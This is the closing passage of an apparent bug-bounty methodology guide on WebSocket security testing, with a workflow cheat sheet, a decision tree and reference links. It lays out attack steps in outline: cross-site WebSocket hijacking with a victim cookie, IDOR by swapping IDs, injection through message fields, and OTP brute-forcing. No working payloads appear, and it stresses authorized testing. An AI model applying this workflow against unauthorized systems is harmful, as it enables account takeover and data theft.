- **Injection/IDOR** — your own OOB host; two of your own accounts; revert any state changes.
- **Authorized targets only** — bug-bounty in-scope, signed engagements, CTFs, own labs.

**21.3 Where WS bugs cluster:** chat/notifications (XSS+CSWSH), trading/wallet feeds (CSWSH→state change), collaborative editors (IDOR over messages), admin/live dashboards (BFLA), and framework defaults (socket.io/SignalR/STOMP Origin & channel-authz gaps).

---

# Appendix A — WebSocket Workflow Cheat Sheet

```
0. Find WS endpoints (DevTools→WS, JS new WebSocket(/io(/SockJS(, Burp WebSockets, /ws /socket.io /cable /hub). §3
1. BASELINE the handshake: auth = COOKIE or TOKEN? Origin checked? wss? map message types (id/action/rendered/backend). §4
2. CSWSH (§5): websocat with victim cookie + foreign Origin → connects authed? → real-browser PoC (§15).
3. AUTH over WS (§6): per-message authz? swap B's id (IDOR) · privileged message types (BFLA) · unauth message types.
4. MESSAGE injection (§8): XSS(rendered to others) · SQLi/NoSQLi · cmdi/SSRF · path-traversal · mass-assign · deserialize.
5. Rate-limit brute (§10) · transport ws://+token-in-URL (§7) · DoS measured (§11) · smuggling/proxy (§12) · framework (§13).
6. VALIDATE (CSWSH cross-origin browser proof / injection signal / two-account IDOR) → FP filter → CVSS+CWE-1385 → PoC → dedup. §15-§20
```

# Appendix B — WebSocket Decision Tree

```
Found a ws(s):// endpoint?                                  NO → keep hunting (JS, DevTools, framework paths)
            │ YES
Read the handshake → how is it authenticated?
   ├─ COOKIE (auto-sent) + Origin NOT validated ........... CSWSH → real-browser PoC → read data + state change → ATO  §5/§9
   │        └─ Origin validated? → try weak-allow-list bypasses (§5.2); else CSWSH not viable
   ├─ TOKEN the JS adds (URL/subproto/first-msg) .......... CSWSH N/A → pivot to message layer
   └─ (either) connected socket:
        ├─ swap B's id in a frame → B's data? ............. IDOR/BFLA over WS  §6
        ├─ message field → DB/shell/URL/rendered? ......... SQLi/NoSQLi/cmdi/SSRF/stored-XSS  §8
        ├─ login/otp over WS → no per-message limit? ...... brute → ATO  §10
        └─ ws:// or token-in-URL? ......................... transport weakness  §7
Then: severity by what the socket can READ + DO; PoC; report.
```

# Appendix C — Important Links
- **PortSwigger — WebSockets security** (labs: manipulating messages, manipulating the handshake, **cross-site WebSocket hijacking**): https://portswigger.net/web-security/websockets
- **OWASP WSTG** — Testing WebSockets; **OWASP** WebSocket security cheat sheet
- **CWE-1385** (Missing Origin Validation in WebSockets) https://cwe.mitre.org/data/definitions/1385.html · **CWE-346** /346 · **CWE-352** /352 · **CWE-319** /319 · **CWE-306/862/285** (authn/authz)
- **RFC 6455** (The WebSocket Protocol); **RFC 7692** (`permessage-deflate`); **graphql-ws** & **subscriptions-transport-ws** sub-protocols
- **Tools** — Burp (WebSockets history + CSWSH PoC generator), **websocat**, **wscat**, Python **websockets**, **STÖK/ws-harness**
- **Related kits** — CSRF (the cookie/SameSite gate), CORS (Origin allow-list bypasses), IDOR (two-account proof), XSS (escalate stored-XSS), GraphQL (subscriptions/CSWSH), Request Smuggling (upgrade smuggling).

> **Authorized testing only.** CSWSH PoCs exfiltrate to **your** server using **your** victim test account; prove cross-site in a real browser; two own accounts for IDOR; measured counts for brute; measure-don't-flood for DoS; revert state. Report **impact** (data theft, ATO, RCE, XSS, cross-user) — not "no Origin check."

**Contact:** [LinkedIn](https://in.linkedin.com/in/x8bitranjit)
